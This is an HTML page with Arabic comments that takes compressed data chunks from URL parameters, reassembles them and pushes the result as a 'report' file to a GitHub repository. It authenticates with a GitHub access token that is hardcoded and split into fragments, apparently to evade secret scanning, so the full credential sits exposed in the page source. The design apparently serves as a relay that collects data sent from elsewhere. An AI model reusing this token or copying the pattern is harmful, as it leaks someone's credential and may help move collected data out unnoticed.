<!DOCTYPE html>
<html>
<head>
  <title>Upload Complete</title>
  <meta charset="utf-8">
  <style>
    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:80px;}
    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:500px;margin:0 auto;}
    h2{color:#e74c3c;margin-bottom:20px;}
    a{color:#0f0;text-decoration:underline;}
  </style>
</head>
<body>
<div class="box">
  <h2 id="head">جاري رفع التقرير...</h2>
  <p id="status">...</p>
  <p><a href="https://youssefmettwaly.github.io/tero-report/index.html">Go to Admin Panel</a></p>
</div>

<script>
// التوكن مقسّم لأمان أكثر
const TOKEN = (function(){
  const parts = [
    "github_pat_11A3ZKARI0",
    "Q8CbII0GvNSt_",
    "hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra",
    "276EGSZZQGRkTKn8W"
  ];
  return parts.join('');
})();

const REPO_OWNER = "youssefmettwaly";
const REPO_NAME = "tero-report";

// تخزين الأجزاء المستقبلة
let chunks = {};
let totalChunks = 0;

function uploadToGitHub(content) {
  const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
  const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filename}`;
  
  fetch(apiUrl, {
    method: 'PUT',
    headers: {
      'Authorization': `token ${TOKEN}`,
      'Content-Type': 'application/json',
      'Accept': 'application/vnd.github.v3+json'
    },
    body: JSON.stringify({
      message: `New report - ${filename}`,
      content: btoa(unescape(encodeURIComponent(content))),
      branch: 'main'
    })
  }).then(r => {
    if (r.ok) {
      reportDone();
    } else {
      console.error('GitHub API error:', r.status);
      reportFail();
    }
  }).catch(err => {
    console.error('Upload error:', err);
    reportFail();
  });
}

function decompressData(compressedData) {
  try {
    // فك الـ base64
    const binaryString = atob(compressedData);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    
    // فك الضغط (zlib)
    // نستخدم pako library للفك
    return pako.inflate(bytes, { to: 'string' });
  } catch (e) {
    console.error('Decompression error:', e);
    return null;
  }
}

function processChunks() {
  // تجميع جميع الأجزاء بالترتيب
  let allData = '';
  for (let i = 1; i <= totalChunks; i++) {
    if (!chunks[i]) {
      console.error(`Missing chunk ${i}`);
      reportFail();
      return;
    }
    allData += chunks[i];
  }
  
  // فك الضغط
  const decompressed = decompressData(allData);
  if (!decompressed) {
    reportFail();
    return;
  }
  
  // رفع على GitHub
  uploadToGitHub(decompressed);
}

window.onload = () => {
  try {
    const params = new URLSearchParams(location.search);
    const total = params.get('total');
    const part = params.get('part');
    const data = params.get('data');
    
    if (!data) {
      document.getElementById('status').textContent = "لا توجد بيانات لرفعها";
      reportFail();
      return;
    }
    
    // الجزء الأول يحتوي على عدد الأجزاء الكلي
    if (total) {
      totalChunks = parseInt(total);
      chunks[1] = data;
      document.getElementById('status').textContent = `جزء 1/${totalChunks} تم استقباله...`;
    } 
    // باقي الأجزاء
    else if (part) {
      const partNum = parseInt(part);
      chunks[partNum] = data;
      document.getElementById('status').textContent = `جزء ${partNum} تم استقباله...`;
      
      // تحقق إذا استقبلنا جميع الأجزاء
      let allReceived = true;
      for (let i = 1; i <= totalChunks; i++) {
        if (!chunks[i]) {
          allReceived = false;
          break;
        }
      }
      
      if (allReceived) {
        document.getElementById('status').textContent = "جميع الأجزاء وصلت، جاري التجميع...";
        setTimeout(processChunks, 1000);
      }
    }
  } catch (e) {
    console.error('Error:', e);
    reportFail();
  }
};

function reportDone() {
  document.getElementById('head').textContent = "Upload Complete! ✓";
  document.getElementById('status').textContent = "تم رفع التقرير بنجاح إلى GitHub";
}

function reportFail() {
  document.getElementById('head').textContent = "Upload Failed! ✗";
  document.getElementById('status').textContent = "حدث خطأ أثناء رفع التقرير";
}
</script>

<!-- مكتبة pako لفك الضغط -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
</body>
</html>
